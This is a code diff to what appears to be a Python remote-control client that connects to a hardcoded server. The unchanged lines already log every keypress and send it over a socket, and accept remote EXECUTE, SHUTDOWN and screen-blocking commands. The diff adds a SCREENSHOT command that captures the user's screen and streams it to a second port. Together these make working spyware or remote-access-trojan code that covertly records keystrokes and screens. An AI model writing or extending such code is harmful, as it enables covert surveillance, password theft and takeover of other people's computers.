@@ -16,6 +16,10 @@ KEYS_TO_BLOCK = [
     'win',
 ]
 KEYS_TO_BLOCK += [f'f{i}' for i in range(1, 13)]
+IMAGE = 'IMAGE'
+RELATIVE_IMAGE_FILE_NAME = 'image.png'
+KEY = 'KEY'
+STOP_IMAGE = 'STOP_IMAGE'
 
 
 class block_:
@@ -56,12 +60,27 @@ def unblock(message):
         server.send(b"MESSAGE Screen has already been unblocked so uh you did nothing")
 
 
+def send_image(message):
+    image = pyautogui.screenshot()
+    image.save(RELATIVE_IMAGE_FILE_NAME)
+    image_server.send(bytes(f'{IMAGE} {os.stat(RELATIVE_IMAGE_FILE_NAME).st_size}', 'utf-8'))
+    img = open(RELATIVE_IMAGE_FILE_NAME, 'rb')
+    
+    print('Sending screenshot')
+    while True:
+        line = img.read(512)
+        if not line:
+            break
+        image_server.send(line)
+    print('Ending screenshot')
+    img.close()  
 
 ACTIONS = {
     "EXECUTE": execute,
     "SHUTDOWN": shutdown,
     "BLOCK": block,
     "UNBLOCK": unblock,
+    "SCREENSHOT": send_image,
 }
 
 
@@ -73,7 +92,7 @@ def on_press(key):
         key = key.name
     except:
         pass
-    server.send(bytes(f'KEY {key}|', 'utf-8'))
+    server.send(bytes(f'{KEY} {key}|', 'utf-8'))
 
 def on_release(key):
     print('a key has been released')
@@ -85,14 +104,17 @@ def keylog(): #will start once program starts
 
 
 thread(keylog, ())
-
-        
+      
 
 while True:
     IP = '192.168.4.66'#the ip for serber
     PORT = 31415
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.connect((IP, PORT))
+
+    IMAGE_PORT = 31416 #this one is to send images seperatly as to not clog
+    image_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    image_server.connect((IP, IMAGE_PORT))
     while True:
         try:
             try:
